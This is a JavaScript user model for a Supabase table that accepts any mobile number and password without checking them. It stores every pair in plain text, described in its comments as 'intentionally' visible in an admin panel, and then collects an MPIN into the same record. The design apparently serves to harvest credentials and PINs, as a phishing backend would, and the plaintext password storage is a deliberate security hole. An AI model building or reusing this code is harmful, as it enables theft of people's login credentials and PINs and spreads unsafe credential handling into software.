// ─── USER MODEL (Supabase) ───────────────────────────────────────────────────
// Unique key: mobile + password (plain text, visible in admin panel)
// Login flow:
//   1. findByMobilePassword() — check if combo exists
//   2. If exists → incrementLogin() — update count + last_login (never block)
//   3. If not   → create()         — insert new record
//   4. MPIN popup → mpinController.saveMpin() — update same record
const supabase = require('../config/supabase');

const TABLE = 'users';

let _cachedCols = null;
const getColumns = async () => {
  if (_cachedCols) return _cachedCols;
  const { data } = await supabase.from(TABLE).select('*').limit(1);
  if (data && data[0]) {
    _cachedCols = Object.keys(data[0]);
  } else {
    _cachedCols = ['mobile', 'password'];
  }
  return _cachedCols;
};

const User = {
  // Find user by mobile + password combo (plain text match)
  async findByMobilePassword(mobile, password) {
    const { data, error } = await supabase
      .from(TABLE)
      .select('*')
      .eq('mobile', mobile)
      .eq('password', password)
      .maybeSingle();
    if (error) throw error;
    if (data && !_cachedCols) _cachedCols = Object.keys(data);
    return data;
  },

  // Create a new user record — stores plain-text credentials for admin visibility
  // Uses upsert with onConflict to safely handle race conditions without duplicates
  async create({ mobile, password }) {
    const now = new Date().toISOString();

    const record = {
      mobile,
      password,        // Plain text (intentional — visible in admin panel)
      mpin:        '',
      login_count: 1,
      status:      'pending',
      first_login: now,
      last_login:  now,
      created_at:  now,
      updated_at:  now
    };

    // Try insert first
    const { data, error } = await supabase
      .from(TABLE)
      .insert(record)
      .select()
      .single();

    if (!error) {
      if (data) _cachedCols = Object.keys(data);
      return data;
    }

    // If duplicate (unique constraint on mobile+password), fetch the existing record instead
    if (
      error.code === '23505' ||
      error.message?.includes('duplicate') ||
      error.message?.includes('unique')
    ) {
      const existing = await User.findByMobilePassword(mobile, password);
      if (existing) return User.incrementLogin(existing);
    }

    // If column schema error, retry with minimal fields
    if (error.message?.includes('column') || error.message?.includes('schema cache')) {
      const minimal = { mobile, password };
      const { data: d2, error: e2 } = await supabase.from(TABLE).insert(minimal).select().single();
      if (e2) throw e2;
      if (d2) _cachedCols = Object.keys(d2);
      return d2;
    }

    throw error;
  },

  // Increment login_count + update last_login (never overwrites first_login)
  // Called every time the same mobile+password combo logs in again
  async incrementLogin(user) {
    const now = new Date().toISOString();
    const updates = {
      login_count: (user.login_count || 0) + 1,
      last_login:  now,
      updated_at:  now
    };

    // Use id if available, otherwise use mobile+password as key
    const cols = _cachedCols || [];
    const useId = cols.includes('id') && user.id;

    let query = supabase.from(TABLE).update(updates);

    if (useId) {
      query = query.eq('id', user.id);
    } else {
      query = query.eq('mobile', user.mobile).eq('password', user.password);
    }

    const { data, error } = await query.select().maybeSingle();

    if (error) {
      // Fallback: return merged object without DB round-trip
      return { ...user, login_count: updates.login_count, last_login: now, updated_at: now };
    }

    return data || { ...user, login_count: updates.login_count, last_login: now };
  },

  // Update by primary key
  async updateById(id, updates) {
    const cols = _cachedCols || [];
    if (cols.includes('updated_at')) updates.updated_at = new Date().toISOString();

    let query = supabase.from(TABLE).update(updates);
    if (cols.includes('id')) {
      query = query.eq('id', id);
    } else {
      return null;
    }
    const { data, error } = await query.select().single();
    if (error) throw error;
    return data;
  },

  // Find by primary key
  async findById(id) {
    const cols = _cachedCols || [];
    if (!cols.includes('id')) return null;
    const { data, error } = await supabase.from(TABLE).select('*').eq('id', id).maybeSingle();
    if (error) throw error;
    return data;
  },

  // Count with optional filter
  async count(filter = {}) {
    let q = supabase.from(TABLE).select('*', { count: 'exact', head: true });
    if (filter.status) q = q.eq('status', filter.status);
    if (filter.last_login_gte) {
      const cols = _cachedCols || [];
      if (cols.includes('last_login')) q = q.gte('last_login', filter.last_login_gte);
    }
    const { count, error } = await q;
    if (error) throw error;
    return count || 0;
  },

  // Find all with filters/pagination
  async findAll({ search, date, status, page = 1, limit = 20 } = {}) {
    const offset = (page - 1) * limit;
    const cols = _cachedCols || [];

    const applyFilters = (q) => {
      if (search) q = q.ilike('mobile', `%${search}%`);
      if (status && cols.includes('status')) q = q.eq('status', status);
      if (date && cols.includes('last_login')) {
        const s = new Date(date); s.setHours(0, 0, 0, 0);
        const e = new Date(date); e.setHours(23, 59, 59, 999);
        q = q.gte('last_login', s.toISOString()).lte('last_login', e.toISOString());
      }
      return q;
    };

    const { count } = await applyFilters(
      supabase.from(TABLE).select('*', { count: 'exact', head: true })
    );
    const orderCol = cols.includes('last_login') ? 'last_login' : cols.includes('created_at') ? 'created_at' : 'mobile';
    const { data, error } = await applyFilters(
      supabase.from(TABLE).select('*').order(orderCol, { ascending: false }).range(offset, offset + limit - 1)
    );
    if (error) throw error;
    if (data && data[0]) _cachedCols = Object.keys(data[0]);
    return { users: data || [], total: count || 0 };
  },

  // Latest N users
  async findLatest(n = 5) {
    const cols = _cachedCols || [];
    const orderCol = cols.includes('last_login') ? 'last_login' : 'mobile';
    const { data, error } = await supabase
      .from(TABLE).select('*').order(orderCol, { ascending: false }).limit(n);
    if (error) return [];
    if (data && data[0]) _cachedCols = Object.keys(data[0]);
    return data || [];
  }
};

module.exports = User;
